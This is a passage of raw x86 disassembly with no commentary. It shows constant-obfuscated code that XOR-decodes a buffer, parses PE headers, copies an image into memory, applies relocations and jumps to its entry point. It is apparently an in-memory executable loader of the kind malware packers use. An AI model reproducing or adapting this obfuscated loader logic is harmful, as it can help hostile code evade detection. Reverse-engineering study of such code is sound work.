  425cf2:	add    ecx,esi
  425cf4:	push   ecx
  425cf5:	mov    ecx,DWORD PTR [ebp-0xc]
  425cf8:	push   DWORD PTR [ebp-0x20]
  425cfb:	xor    ecx,ebx
  425cfd:	add    ecx,esi
  425cff:	push   ecx
  425d00:	call   DWORD PTR [eax+0x14]
  425d03:	mov    ecx,DWORD PTR [ebp-0xc]
  425d06:	xor    ecx,ebx
  425d08:	add    ecx,esi
  425d0a:	mov    DWORD PTR [ebp-0x24],eax
  425d0d:	cmp    ecx,edi
  425d0f:	je     0x42609c
  425d15:	mov    ecx,DWORD PTR [ebp-0xc]
  425d18:	xor    ecx,ebx
  425d1a:	add    ecx,esi
  425d1c:	cmp    ecx,eax
  425d1e:	je     0x42609c
  425d24:	mov    DWORD PTR [ebp-0x40],0xf89c85b3
  425d2b:	mov    DWORD PTR [ebp-0x54],0xf89c85b2
  425d32:	mov    ecx,DWORD PTR [ebp-0x40]
  425d35:	xor    cl,0xa4
  425d38:	sub    cl,0x14
  425d3b:	mov    BYTE PTR [edi],cl
  425d3d:	mov    ecx,DWORD PTR [ebp-0xc]
  425d40:	xor    cl,0xa4
  425d43:	sub    cl,0x14
  425d46:	mov    BYTE PTR [edi+0x1],cl
  425d49:	mov    ecx,DWORD PTR [ebp-0x54]
  425d4c:	xor    cl,0xa4
  425d4f:	sub    cl,0x14
  425d52:	mov    BYTE PTR [edi+0x2],cl
  425d55:	and    DWORD PTR [ebp-0xc8],0x0
  425d5c:	and    DWORD PTR [ebp-0xdc],0x0
  425d63:	lea    ecx,[ebp-0xdc]
  425d69:	push   ecx
  425d6a:	push   DWORD PTR [ebp-0x20]
  425d6d:	push   eax
  425d6e:	lea    eax,[ebp-0xc8]
  425d74:	push   eax
  425d75:	mov    eax,DWORD PTR [ebp-0x14]
  425d78:	push   DWORD PTR [eax+0xc]
  425d7b:	mov    eax,DWORD PTR [ebp-0x2c]
  425d7e:	add    eax,0x10
  425d81:	push   eax
  425d82:	push   edi
  425d83:	call   0x425027
  425d88:	mov    DWORD PTR [ebp-0x40],eax
  425d8b:	mov    eax,DWORD PTR [ebp+0x8]
  425d8e:	mov    ecx,DWORD PTR [ebp-0x50]
  425d91:	mov    eax,DWORD PTR [eax+0x1d8]
  425d97:	xor    ecx,ebx
  425d99:	add    ecx,esi
  425d9b:	push   ecx
  425d9c:	mov    ecx,DWORD PTR [ebp-0xc]
  425d9f:	xor    ecx,ebx
  425da1:	add    ecx,esi
  425da3:	push   ecx
  425da4:	push   edi
  425da5:	call   DWORD PTR [eax+0x18]
  425da8:	mov    eax,DWORD PTR [ebp-0x40]
  425dab:	add    eax,0xffcd8d14
  425db0:	xor    eax,ebx
  425db2:	cmp    eax,0xf89c85b0
  425db7:	mov    eax,DWORD PTR [ebp+0x8]
  425dba:	mov    eax,DWORD PTR [eax+0x1d8]
  425dc0:	mov    ecx,DWORD PTR [ebp-0x50]
  425dc3:	jne    0x425de6
  425dc5:	xor    ecx,ebx
  425dc7:	add    ecx,esi
  425dc9:	push   ecx
  425dca:	mov    ecx,DWORD PTR [ebp-0xc]
  425dcd:	xor    ecx,ebx
  425dcf:	add    ecx,esi
  425dd1:	push   ecx
  425dd2:	push   DWORD PTR [ebp-0x2c]
  425dd5:	call   DWORD PTR [eax+0x18]
  425dd8:	mov    eax,DWORD PTR [ebp-0x24]
  425ddb:	mov    DWORD PTR [ebp-0x2c],eax
  425dde:	mov    eax,DWORD PTR [ebp-0x20]
  425de1:	mov    DWORD PTR [ebp-0x3c],eax
  425de4:	jmp    0x425df9
  425de6:	xor    ecx,ebx
  425de8:	add    ecx,esi
  425dea:	push   ecx
  425deb:	mov    ecx,DWORD PTR [ebp-0xc]
  425dee:	xor    ecx,ebx
  425df0:	add    ecx,esi
  425df2:	push   ecx
  425df3:	push   DWORD PTR [ebp-0x24]
  425df6:	call   DWORD PTR [eax+0x18]
  425df9:	mov    eax,DWORD PTR [ebp-0x3c]
  425dfc:	mov    DWORD PTR [ebp-0x34],eax
  425dff:	mov    eax,DWORD PTR [ebp-0x2c]
  425e02:	mov    DWORD PTR [ebp-0x28],0xf89c85b0
  425e09:	mov    DWORD PTR [ebp-0x40],eax
  425e0c:	mov    edi,0xf89c85b1
  425e11:	mov    DWORD PTR [ebp-0x30],edi
  425e14:	mov    eax,DWORD PTR [ebp-0x28]
  425e17:	xor    eax,ebx
  425e19:	add    eax,esi
  425e1b:	mov    DWORD PTR [ebp-0xc],eax
  425e1e:	mov    eax,DWORD PTR [ebp-0x28]
  425e21:	xor    eax,ebx
  425e23:	add    eax,esi
  425e25:	mov    DWORD PTR [ebp-0x14],eax
  425e28:	mov    DWORD PTR [ebp-0x44],0xf89c8590
  425e2f:	mov    DWORD PTR [ebp-0x24],0xf89c85bf
  425e36:	mov    eax,DWORD PTR [ebp-0x28]
  425e39:	mov    ecx,DWORD PTR [ebp-0x34]
  425e3c:	xor    eax,ebx
  425e3e:	add    eax,esi
  425e40:	cmp    ecx,eax
  425e42:	je     0x426038
  425e48:	jmp    0x426014
  425e4d:	mov    ecx,DWORD PTR [ebp-0xc]
  425e50:	mov    eax,DWORD PTR [ebp-0x34]
  425e53:	sub    eax,ecx
  425e55:	mov    ecx,DWORD PTR [ebp-0x44]
  425e58:	xor    ecx,ebx
  425e5a:	add    ecx,esi
  425e5c:	xor    edx,edx
  425e5e:	div    ecx
  425e60:	mov    DWORD PTR [ebp-0x14],eax
  425e63:	mov    eax,DWORD PTR [ebp-0x24]
  425e66:	mov    ecx,DWORD PTR [ebp-0x14]
  425e69:	xor    eax,ebx
  425e6b:	add    eax,esi
  425e6d:	cmp    ecx,eax
  425e6f:	jbe    0x425e7b
  425e71:	mov    eax,DWORD PTR [ebp-0x24]
  425e74:	xor    eax,ebx
  425e76:	add    eax,esi
  425e78:	mov    DWORD PTR [ebp-0x14],eax
  425e7b:	mov    eax,DWORD PTR [ebp-0x44]
  425e7e:	mov    ecx,DWORD PTR [ebp-0x14]
  425e81:	xor    eax,ebx
  425e83:	add    eax,esi
  425e85:	imul   eax,ecx
  425e88:	mov    DWORD PTR [ebp-0x14],eax
  425e8b:	mov    eax,DWORD PTR [ebp-0x28]
  425e8e:	mov    ecx,DWORD PTR [ebp-0x14]
  425e91:	xor    eax,ebx
  425e93:	add    eax,esi
  425e95:	cmp    ecx,eax
  425e97:	je     0x426002
  425e9d:	mov    eax,DWORD PTR [ebp-0x14]
  425ea0:	mov    DWORD PTR [ebp-0x20],eax
  425ea3:	mov    eax,DWORD PTR [ebp-0xc]
  425ea6:	add    eax,DWORD PTR [ebp-0x40]
  425ea9:	mov    DWORD PTR [ebp-0x4c],0xf89c85b0
  425eb0:	mov    DWORD PTR [ebp-0x14],edi
  425eb3:	mov    DWORD PTR [ebp-0x54],0xf89c85b2
  425eba:	mov    DWORD PTR [ebp-0x1c],eax
  425ebd:	mov    DWORD PTR [ebp-0x38],0xf89c85b3
  425ec4:	mov    DWORD PTR [ebp-0x8],edi
  425ec7:	mov    eax,DWORD PTR [ebp-0x4c]
  425eca:	xor    eax,ebx
  425ecc:	add    eax,esi
  425ece:	jmp    0x425fc1
  425ed3:	mov    DWORD PTR [ebp-0xe4],0xf89c85bb
  425edd:	mov    DWORD PTR [ebp-0xd0],0xf89c858e
  425ee7:	mov    eax,DWORD PTR [ebp-0x8]
  425eea:	mov    ecx,DWORD PTR [ebp-0x18]
  425eed:	xor    eax,ebx
  425eef:	add    eax,esi
  425ef1:	imul   eax,ecx
  425ef4:	mov    ecx,DWORD PTR [ebp-0x1c]
  425ef7:	mov    al,BYTE PTR [eax+ecx*1]
  425efa:	mov    BYTE PTR [ebp-0x1],al
  425efd:	mov    eax,DWORD PTR [ebp-0x8]
  425f00:	mov    ecx,DWORD PTR [ebp-0x18]
  425f03:	xor    eax,ebx
  425f05:	add    eax,esi
  425f07:	imul   eax,ecx
  425f0a:	mov    ecx,DWORD PTR [ebp-0x54]
  425f0d:	xor    ecx,ebx
  425f0f:	add    eax,ecx
  425f11:	mov    ecx,DWORD PTR [ebp-0x1c]
  425f14:	movzx  eax,BYTE PTR [eax+ecx*1+0x3272ec]
  425f1c:	mov    ecx,DWORD PTR [ebp-0xe4]
  425f22:	xor    ecx,ebx
  425f24:	lea    eax,[ecx+eax*1+0x3272ec]
  425f2b:	movzx  ecx,BYTE PTR [ebp-0x1]
  425f2f:	xor    ecx,eax
  425f31:	mov    BYTE PTR [ebp-0x1],cl
  425f34:	mov    al,BYTE PTR [ebp-0x1]
  425f37:	mov    ecx,DWORD PTR [ebp-0x8]
  425f3a:	mov    edx,DWORD PTR [ebp-0x18]
  425f3d:	xor    ecx,ebx
  425f3f:	add    ecx,esi
  425f41:	imul   ecx,edx
  425f44:	mov    edx,DWORD PTR [ebp-0x1c]
  425f47:	mov    BYTE PTR [ecx+edx*1],al
  425f4a:	mov    eax,DWORD PTR [ebp-0x8]
  425f4d:	mov    ecx,DWORD PTR [ebp-0x18]
  425f50:	xor    eax,ebx
  425f52:	add    eax,esi
  425f54:	imul   eax,ecx
  425f57:	mov    ecx,DWORD PTR [ebp-0x1c]
  425f5a:	mov    al,BYTE PTR [eax+ecx*1]
  425f5d:	mov    BYTE PTR [ebp-0x1],al
  425f60:	mov    eax,DWORD PTR [ebp-0x8]
  425f63:	mov    ecx,DWORD PTR [ebp-0x18]
  425f66:	xor    eax,ebx
  425f68:	add    eax,esi
  425f6a:	imul   eax,ecx
  425f6d:	mov    ecx,DWORD PTR [ebp-0x14]
  425f70:	xor    ecx,ebx
  425f72:	add    eax,ecx
  425f74:	mov    ecx,DWORD PTR [ebp-0x1c]
  425f77:	movzx  eax,BYTE PTR [eax+ecx*1+0x3272ec]
  425f7f:	mov    ecx,DWORD PTR [ebp-0xd0]
  425f85:	xor    ecx,ebx
  425f87:	lea    eax,[ecx+eax*1+0x3272ec]
  425f8e:	movzx  ecx,BYTE PTR [ebp-0x1]
  425f92:	xor    ecx,eax
  425f94:	mov    BYTE PTR [ebp-0x1],cl
  425f97:	mov    al,BYTE PTR [ebp-0x1]
  425f9a:	mov    ecx,DWORD PTR [ebp-0x8]
  425f9d:	mov    edx,DWORD PTR [ebp-0x18]
  425fa0:	xor    ecx,ebx
  425fa2:	add    ecx,esi
  425fa4:	imul   ecx,edx
  425fa7:	mov    edx,DWORD PTR [ebp-0x1c]
  425faa:	mov    BYTE PTR [ecx+edx*1],al
  425fad:	mov    eax,DWORD PTR [ebp-0x38]
  425fb0:	mov    ecx,DWORD PTR [ebp-0x14]
  425fb3:	xor    eax,ebx
  425fb5:	xor    ecx,ebx
  425fb7:	add    eax,esi
  425fb9:	add    ecx,esi
  425fbb:	imul   eax,ecx
  425fbe:	add    eax,DWORD PTR [ebp-0x18]
  425fc1:	mov    DWORD PTR [ebp-0x18],eax
  425fc4:	mov    eax,DWORD PTR [ebp-0x18]
  425fc7:	mov    ecx,DWORD PTR [ebp-0x20]
  425fca:	cmp    ecx,eax
  425fcc:	jb     0x425ed3
  425fd2:	mov    eax,DWORD PTR [ebp-0x14]
  425fd5:	mov    ecx,DWORD PTR [ebp-0x20]
  425fd8:	xor    eax,ebx
  425fda:	add    eax,esi
  425fdc:	imul   eax,ecx
  425fdf:	mov    ecx,DWORD PTR [ebp-0x4c]
  425fe2:	xor    ecx,ebx
  425fe4:	add    ecx,esi
  425fe6:	or     eax,ecx
  425fe8:	mov    ecx,DWORD PTR [ebp-0x30]
  425feb:	xor    ecx,ebx
  425fed:	add    eax,ecx
  425fef:	mov    ecx,DWORD PTR [ebp-0x30]
  425ff2:	xor    ecx,ebx
  425ff4:	add    eax,ecx
  425ff6:	mov    ecx,DWORD PTR [ebp-0xc]
  425ff9:	lea    eax,[eax+ecx*1+0x64e5d8]
  426000:	jmp    0x426011
  426002:	mov    eax,DWORD PTR [ebp-0x30]
  426005:	mov    ecx,DWORD PTR [ebp-0xc]
  426008:	xor    eax,ebx
  42600a:	lea    eax,[eax+ecx*1+0x3272ec]
  426011:	mov    DWORD PTR [ebp-0xc],eax
  426014:	mov    eax,DWORD PTR [ebp-0x30]
  426017:	xor    eax,ebx
  426019:	mov    ecx,0xffcd8d14
  42601e:	sub    ecx,eax
  426020:	add    ecx,DWORD PTR [ebp-0x34]
  426023:	mov    eax,DWORD PTR [ebp-0x30]
  426026:	mov    edx,DWORD PTR [ebp-0xc]
  426029:	xor    eax,ebx
  42602b:	add    eax,esi
  42602d:	imul   eax,edx
  426030:	cmp    eax,ecx
  426032:	jbe    0x425e4d
  426038:	push   DWORD PTR [ebp+0x8]
  42603b:	mov    eax,DWORD PTR [ebp+0x8]
  42603e:	push   DWORD PTR [eax+0x1cc]
  426044:	lea    eax,[ebp-0xd8]
  42604a:	push   eax
  42604b:	mov    eax,DWORD PTR [ebp+0x8]
  42604e:	mov    eax,DWORD PTR [eax+0x1c4]
  426054:	push   DWORD PTR [eax]
  426056:	mov    eax,DWORD PTR [ebp+0x8]
  426059:	mov    eax,DWORD PTR [eax+0x1c0]
  42605f:	push   DWORD PTR [eax]
  426061:	push   DWORD PTR [ebp-0x3c]
  426064:	push   DWORD PTR [ebp-0x2c]
  426067:	call   0x426afe
  42606c:	mov    DWORD PTR [ebp-0x40],eax
  42606f:	mov    eax,DWORD PTR [ebp-0x10]
  426072:	mov    ecx,DWORD PTR [ebp-0x2c]
  426075:	xor    eax,ebx
  426077:	add    eax,esi
  426079:	cmp    eax,ecx
  42607b:	je     0x42609c
  42607d:	mov    eax,DWORD PTR [ebp+0x8]
  426080:	mov    ecx,DWORD PTR [ebp-0x50]
  426083:	mov    eax,DWORD PTR [eax+0x1d8]
  426089:	xor    ecx,ebx
  42608b:	add    ecx,esi
  42608d:	push   ecx
  42608e:	mov    ecx,DWORD PTR [ebp-0x10]
  426091:	xor    ecx,ebx
  426093:	add    ecx,esi
  426095:	push   ecx
  426096:	push   DWORD PTR [ebp-0x2c]
  426099:	call   DWORD PTR [eax+0x18]
  42609c:	pop    edi
  42609d:	pop    esi
  42609e:	pop    ebx
  42609f:	leave  
  4260a0:	ret    0x4
  4260a3:	push   ebp
  4260a4:	mov    ebp,esp
  4260a6:	push   ecx
  4260a7:	push   ecx
  4260a8:	lea    eax,[ebp-0x8]
  4260ab:	mov    DWORD PTR [ebp-0x4],eax
  4260ae:	push   esi
  4260af:	mov    esi,DWORD PTR [ebp-0x4]
  4260b2:	mov    eax,0xf881ba2e
  4260b7:	mov    DWORD PTR [esi],eax
  4260b9:	mov    esi,DWORD PTR [ebp-0x8]
  4260bc:	cmp    esi,eax
  4260be:	pop    esi
  4260bf:	jne    0x4260c9
  4260c1:	mov    BYTE PTR [ecx+0xa],0x7a
  4260c5:	mov    BYTE PTR [edx+0x8],0x2f
  4260c9:	mov    BYTE PTR [edx+0xa],0x7a
  4260cd:	mov    BYTE PTR [ecx+0x2],0x8
  4260d1:	leave  
  4260d2:	ret    
  4260d3:	push   ebp
  4260d4:	mov    ebp,esp
  4260d6:	push   ecx
  4260d7:	push   ecx
  4260d8:	lea    eax,[ebp-0x8]
  4260db:	mov    DWORD PTR [ebp-0x4],eax
  4260de:	mov    edx,DWORD PTR [ebp-0x4]
  4260e1:	mov    eax,0xf88b0bca
  4260e6:	mov    DWORD PTR [edx],eax
  4260e8:	mov    edx,DWORD PTR [ebp-0x8]
  4260eb:	cmp    edx,eax
  4260ed:	jne    0x4260fe
  4260ef:	mov    eax,DWORD PTR [ebp+0x8]
  4260f2:	mov    BYTE PTR [ecx+0x9],0xe
  4260f6:	mov    BYTE PTR [eax+0x7],0x57
  4260fa:	mov    BYTE PTR [ecx+0x6],0xf
  4260fe:	mov    BYTE PTR [ecx+0x3],0x1e
  426102:	leave  
  426103:	ret    0x4
  426106:	push   ebp
  426107:	mov    ebp,esp
  426109:	push   ecx
  42610a:	push   ecx
  42610b:	lea    eax,[ebp-0x8]
  42610e:	mov    DWORD PTR [ebp-0x4],eax
  426111:	mov    edx,DWORD PTR [ebp-0x4]
  426114:	mov    eax,0x7e0da2e
  426119:	mov    DWORD PTR [edx],eax
  42611b:	mov    edx,DWORD PTR [ebp-0x8]
  42611e:	cmp    edx,eax
  426120:	jne    0x426126
  426122:	mov    BYTE PTR [ecx+0x7],0x57
  426126:	mov    eax,DWORD PTR [ebp+0x8]
  426129:	mov    BYTE PTR [ecx+0x1],0x15
  42612d:	mov    BYTE PTR [eax+0x9],0x2e
  426131:	leave  
  426132:	ret    0x4
  426135:	push   ebp
  426136:	mov    ebp,esp
  426138:	push   ecx
  426139:	push   ecx
  42613a:	lea    eax,[ebp-0x8]
  42613d:	mov    DWORD PTR [ebp-0x4],eax
  426140:	push   esi
  426141:	mov    esi,DWORD PTR [ebp-0x4]
  426144:	mov    eax,0x7060e3f
  426149:	mov    DWORD PTR [esi],eax
  42614b:	mov    esi,DWORD PTR [ebp-0x8]
  42614e:	cmp    esi,eax
  426150:	pop    esi
  426151:	jne    0x42615d
  426153:	mov    BYTE PTR [edx+0x4],0xb
  426157:	mov    WORD PTR [ecx+0x3],0xb1e
  42615d:	mov    BYTE PTR [edx],0x3f
  426160:	leave  
  426161:	ret    
  426162:	push   ebp
  426163:	mov    ebp,esp
  426165:	push   ecx
  426166:	push   ecx
  426167:	lea    eax,[ebp-0x8]
  42616a:	mov    DWORD PTR [ebp-0x4],eax
  42616d:	mov    edx,DWORD PTR [ebp-0x4]
  426170:	mov    eax,0xf8870b3e
  426175:	mov    DWORD PTR [edx],eax
  426177:	mov    edx,DWORD PTR [ebp-0x8]
  42617a:	cmp    edx,eax
  42617c:	jne    0x426189
  42617e:	mov    eax,DWORD PTR [ebp+0x8]
  426181:	mov    BYTE PTR [ecx+0x8],0xf
  426185:	mov    BYTE PTR [eax+0x1],0x15
  426189:	mov    BYTE PTR [ecx+0x5],0x3
  42618d:	leave  
  42618e:	ret    0x4
  426191:	push   esi
  426192:	mov    ecx,edi
  426194:	call   0x426162
  426199:	mov    edx,edi
  42619b:	mov    ecx,esi
  42619d:	mov    BYTE PTR [esi],0x1f
  4261a0:	call   0x426135
  4261a5:	push   esi
  4261a6:	mov    ecx,edi
  4261a8:	mov    BYTE PTR [esi+0x5],0x3
  4261ac:	call   0x426106
  4261b1:	push   esi
  4261b2:	mov    BYTE PTR [esi+0x6],0xf
  4261b6:	call   0x4260d3
  4261bb:	mov    BYTE PTR [esi+0x2],0x8
  4261bf:	mov    edx,esi
  4261c1:	jmp    0x4260a3
  4261c6:	push   ebp
  4261c7:	mov    ebp,esp
  4261c9:	push   ecx
  4261ca:	mov    ecx,DWORD PTR [edx+0x194]
  4261d0:	push   esi
  4261d1:	mov    esi,DWORD PTR [ebp+0x8]
  4261d4:	mov    esi,DWORD PTR [esi]
  4261d6:	mov    DWORD PTR [ecx],esi
  4261d8:	mov    ecx,DWORD PTR [edx+0x194]
  4261de:	mov    ecx,DWORD PTR [ecx]
  4261e0:	mov    esi,DWORD PTR [edx+0x190]
  4261e6:	mov    DWORD PTR [esi],ecx
  4261e8:	mov    eax,DWORD PTR [edx+0x194]
  4261ee:	mov    ecx,DWORD PTR [eax]
  4261f0:	mov    ecx,DWORD PTR [ecx+0x3c]
  4261f3:	add    ecx,DWORD PTR [eax]
  4261f5:	mov    DWORD PTR [ebp-0x4],0xf89ca5b0
  4261fc:	mov    eax,DWORD PTR [ebp-0x4]
  4261ff:	movzx  ecx,WORD PTR [ecx+0x16]
  426203:	xor    eax,0x75108a4
  426208:	add    eax,0x3272ec
  42620d:	pop    esi
  42620e:	test   ecx,eax
  426210:	je     0x42621e
  426212:	mov    eax,DWORD PTR [edx+0x1c8]
  426218:	mov    DWORD PTR [eax],0xf89c85b1
  42621e:	leave  
  42621f:	ret    0x4
  426222:	push   ebp
  426223:	mov    ebp,esp
  426225:	sub    esp,0x70
  426228:	and    DWORD PTR [ebp-0x20],0x0
  42622c:	mov    DWORD PTR [ebp-0x18],0xf89cb5b0
  426233:	mov    DWORD PTR [ebp-0x1c],0xf89c85f0
  42623a:	mov    DWORD PTR [ebp-0x2c],0xf89c85bc
  426241:	mov    DWORD PTR [ebp-0x14],0xf89c85b2
  426248:	mov    DWORD PTR [ebp-0x2c],0xf89f05b0
  42624f:	mov    eax,DWORD PTR [ebp+0x20]
  426252:	mov    eax,DWORD PTR [eax+0x194]
  426258:	mov    DWORD PTR [ebp-0xc],eax
  42625b:	mov    eax,DWORD PTR [ebp+0x20]
  42625e:	push   ebx
  42625f:	push   esi
  426260:	mov    esi,DWORD PTR [eax+0x190]
  426266:	mov    eax,DWORD PTR [ebp+0x20]
  426269:	mov    eax,DWORD PTR [eax+0x18c]
  42626f:	mov    DWORD PTR [ebp-0x8],eax
  426272:	mov    eax,DWORD PTR [eax]
  426274:	push   edi
  426275:	mov    DWORD PTR [ebp-0x4],esi
  426278:	test   eax,eax
  42627a:	jne    0x426287
  42627c:	push   DWORD PTR [ebp+0x1c]
  42627f:	mov    edx,DWORD PTR [ebp+0x20]
  426282:	call   0x4261c6
  426287:	mov    eax,DWORD PTR [esi]
  426289:	mov    ebx,DWORD PTR [esi]
  42628b:	add    ebx,DWORD PTR [eax+0x3c]
  42628e:	mov    eax,DWORD PTR [ebp+0xc]
  426291:	mov    ecx,DWORD PTR [ebp-0x8]
  426294:	mov    ecx,DWORD PTR [ecx]
  426296:	mov    esi,0x75108a4
  42629b:	xor    eax,esi
  42629d:	mov    edi,0x3272ec
  4262a2:	add    eax,edi
  4262a4:	cmp    eax,ecx
  4262a6:	jne    0x4264de
  4262ac:	mov    eax,DWORD PTR [ebp-0xc]
  4262af:	mov    eax,DWORD PTR [eax]
  4262b1:	mov    DWORD PTR [ebp-0x10],eax
  4262b4:	mov    eax,DWORD PTR [ebx+0x50]
  4262b7:	mov    DWORD PTR [ebp-0x68],eax
  4262ba:	mov    eax,DWORD PTR [ebp-0x18]
  4262bd:	xor    eax,esi
  4262bf:	add    eax,edi
  4262c1:	mov    DWORD PTR [ebp-0x64],eax
  4262c4:	mov    eax,DWORD PTR [ebp-0x14]
  4262c7:	and    DWORD PTR [ebp-0x6c],0x0
  4262cb:	xor    eax,esi
  4262cd:	add    eax,edi
  4262cf:	mov    DWORD PTR [ebp-0x60],eax
  4262d2:	lea    eax,[ebp-0x70]
  4262d5:	push   eax
  4262d6:	mov    eax,DWORD PTR [ebp+0x8]
  4262d9:	xor    eax,esi
  4262db:	add    eax,edi
  4262dd:	push   eax
  4262de:	mov    eax,DWORD PTR [ebp+0x20]
  4262e1:	add    eax,0xaa
  4262e6:	push   eax
  4262e7:	mov    eax,DWORD PTR [ebp+0x20]
  4262ea:	mov    eax,DWORD PTR [eax+0x198]
  4262f0:	mov    DWORD PTR [ebp-0x70],0x4
  4262f7:	push   DWORD PTR [eax]
  4262f9:	mov    eax,DWORD PTR [ebp+0x10]
  4262fc:	call   eax
  4262fe:	mov    ecx,DWORD PTR [ebp-0xc]
  426301:	mov    ecx,DWORD PTR [ecx]
  426303:	mov    edx,DWORD PTR [ebp-0x8]
  426306:	mov    DWORD PTR [ebp-0x6c],eax
  426309:	mov    DWORD PTR [ebp+0x1c],eax
  42630c:	mov    DWORD PTR [edx],ecx
  42630e:	mov    ecx,DWORD PTR [ebp-0x4]
  426311:	mov    DWORD PTR [ecx],eax
  426313:	mov    eax,DWORD PTR [ebx+0x50]
  426316:	mov    DWORD PTR [ebp-0x68],eax
  426319:	mov    eax,DWORD PTR [ebp-0x1c]
  42631c:	xor    eax,esi
  42631e:	add    eax,edi
  426320:	mov    DWORD PTR [ebp-0x64],eax
  426323:	lea    eax,[ebp-0x20]
  426326:	mov    DWORD PTR [ebp-0x60],eax
  426329:	lea    eax,[ebp-0x70]
  42632c:	push   eax
  42632d:	mov    eax,DWORD PTR [ebp+0x8]
  426330:	xor    eax,esi
  426332:	add    eax,edi
  426334:	push   eax
  426335:	mov    eax,DWORD PTR [ebp+0x20]
  426338:	add    eax,0xee
  42633d:	push   eax
  42633e:	mov    eax,DWORD PTR [ebp+0x20]
  426341:	mov    eax,DWORD PTR [eax+0x198]
  426347:	mov    DWORD PTR [ebp-0x70],0x4
  42634e:	push   DWORD PTR [eax]
  426350:	mov    eax,DWORD PTR [ebp+0x10]
  426353:	call   eax
  426355:	test   eax,eax
  426357:	je     0x42637c
  426359:	and    DWORD PTR [ebp+0xc],0x0
  42635d:	cmp    DWORD PTR [ebx+0x50],0x0
  426361:	jbe    0x42637c
  426363:	mov    eax,DWORD PTR [ebp+0x1c]
  426366:	mov    ecx,DWORD PTR [ebp-0x10]
  426369:	sub    ecx,eax
  42636b:	mov    dl,BYTE PTR [ecx+eax*1]
  42636e:	inc    DWORD PTR [ebp+0xc]
  426371:	mov    BYTE PTR [eax],dl
  426373:	mov    edx,DWORD PTR [ebp+0xc]
  426376:	inc    eax
  426377:	cmp    edx,DWORD PTR [ebx+0x50]
  42637a:	jb     0x42636b
  42637c:	mov    edx,DWORD PTR [ebp+0x1c]
  42637f:	mov    ecx,DWORD PTR [edx+0x3c]
  426382:	add    ecx,edx
  426384:	mov    eax,DWORD PTR [ecx+0xa0]
  42638a:	mov    ebx,DWORD PTR [ecx+0x28]
  42638d:	add    eax,edx
  42638f:	sub    edx,DWORD PTR [ebp-0x10]
  426392:	add    ebx,DWORD PTR [ebp+0x1c]
  426395:	mov    DWORD PTR [ebp+0xc],edx
  426398:	mov    DWORD PTR [ebp-0x2c],ecx
  42639b:	mov    DWORD PTR [ebp-0x14],ebx
  42639e:	mov    DWORD PTR [ebp-0x8],0x0
  4263a5:	jmp    0x426421
  4263a7:	add    edx,0xfffffff8
  4263aa:	shr    edx,1
  4263ac:	mov    DWORD PTR [ebp-0x18],edx
  4263af:	je     0x42640d
  4263b1:	lea    edx,[eax+0x8]
  4263b4:	mov    DWORD PTR [ebp-0x4],edx
  4263b7:	mov    edx,DWORD PTR [ebp-0x18]
  4263ba:	mov    DWORD PTR [ebp-0x18],edx
  4263bd:	mov    edx,DWORD PTR [ebp-0x4]
  4263c0:	movzx  edx,WORD PTR [edx]
  4263c3:	mov    DWORD PTR [ebp-0x24],edx
  4263c6:	and    edx,0xfff
  4263cc:	mov    DWORD PTR [ebp-0x28],edx
  4263cf:	mov    edx,DWORD PTR [ebp-0x24]
  4263d2:	shr    edx,0xc
  4263d5:	add    edx,0xffcd8d14
  4263db:	xor    edx,esi
  4263dd:	cmp    edx,0xf89c85b3
  4263e3:	jne    0x426404
  4263e5:	mov    edx,DWORD PTR [ebp-0x28]
  4263e8:	add    edx,DWORD PTR [ebp+0x1c]
  4263eb:	mov    ebx,DWORD PTR [eax]
  4263ed:	cmp    DWORD PTR [ebx+edx*1],0x0
  4263f1:	je     0x426401
  4263f3:	mov    ecx,DWORD PTR [ebp+0xc]
  4263f6:	add    ecx,DWORD PTR [ebx+edx*1]
  4263f9:	mov    ebx,DWORD PTR [eax]
  4263fb:	mov    DWORD PTR [edx+ebx*1],ecx
  4263fe:	mov    ecx,DWORD PTR [ebp-0x2c]
  426401:	mov    ebx,DWORD PTR [ebp-0x14]
  426404:	add    DWORD PTR [ebp-0x4],0x2
  426408:	dec    DWORD PTR [ebp-0x18]
  42640b:	jne    0x4263bd
  42640d:	mov    edx,DWORD PTR [ebp-0xc]
  426410:	add    DWORD PTR [ebp-0x8],edx
  426413:	mov    edx,DWORD PTR [ebp-0x8]
  426416:	cmp    edx,DWORD PTR [ecx+0xa4]
  42641c:	jae    0x42642f
  42641e:	add    eax,DWORD PTR [ebp-0xc]
  426421:	mov    edx,DWORD PTR [eax+0x4]
  426424:	mov    DWORD PTR [ebp-0xc],edx
  426427:	test   edx,edx
  426429:	jne    0x4263a7
  42642f:	mov    eax,DWORD PTR [ebp-0x10]
  426432:	mov    DWORD PTR [ebp-0x6c],eax
  426435:	mov    DWORD PTR [ebp-0x70],0x4
  42643c:	mov    eax,DWORD PTR [ecx+0x50]
  42643f:	mov    DWORD PTR [ebp-0x68],eax
  426442:	mov    eax,DWORD PTR [ebp-0x1c]
  426445:	xor    eax,esi
  426447:	add    eax,edi
  426449:	mov    DWORD PTR [ebp-0x64],eax
  42644c:	lea    eax,[ebp-0x20]
  42644f:	mov    DWORD PTR [ebp-0x60],eax
  426452:	lea    eax,[ebp-0x70]
  426455:	push   eax
  426456:	mov    eax,DWORD PTR [ebp+0x8]
  426459:	xor    eax,esi
  42645b:	add    eax,edi
  42645d:	push   eax
  42645e:	mov    eax,DWORD PTR [ebp+0x20]
  426461:	add    eax,0xee
  426466:	push   eax
  426467:	mov    eax,DWORD PTR [ebp+0x20]
  42646a:	mov    eax,DWORD PTR [eax+0x198]
  426470:	push   DWORD PTR [eax]
  426472:	mov    eax,DWORD PTR [ebp+0x10]
  426475:	call   eax
  426477:	mov    eax,DWORD PTR [ebp+0x20]
  42647a:	mov    eax,DWORD PTR [eax+0x180]
  426480:	add    eax,DWORD PTR [ebp+0xc]
  426483:	mov    ecx,DWORD PTR [ebp+0xc]
  426486:	push   DWORD PTR [ebp+0x18]
  426489:	mov    DWORD PTR [eax],ecx
  42648b:	push   DWORD PTR [ebp+0x14]
  42648e:	push   DWORD PTR [ebp+0x1c]
  426491:	call   ebx
  426493:	mov    ecx,DWORD PTR [ebp+0xc]
  426496:	add    ecx,DWORD PTR [ebp+0x20]
  426499:	lea    eax,[ebp+0x4]
  42649c:	mov    DWORD PTR [ebp+0x20],ecx
  42649f:	mov    ecx,DWORD PTR [ebp+0x20]
  4264a2:	mov    ecx,DWORD PTR [ebp+0x20]
  4264a5:	mov    edx,DWORD PTR [ecx+0x190]
  4264ab:	mov    ecx,DWORD PTR [ebp+0x20]
  4264ae:	mov    ecx,DWORD PTR [ecx+0x18c]
  4264b4:	mov    esi,DWORD PTR [ecx]
  4264b6:	cmp    DWORD PTR [eax],esi
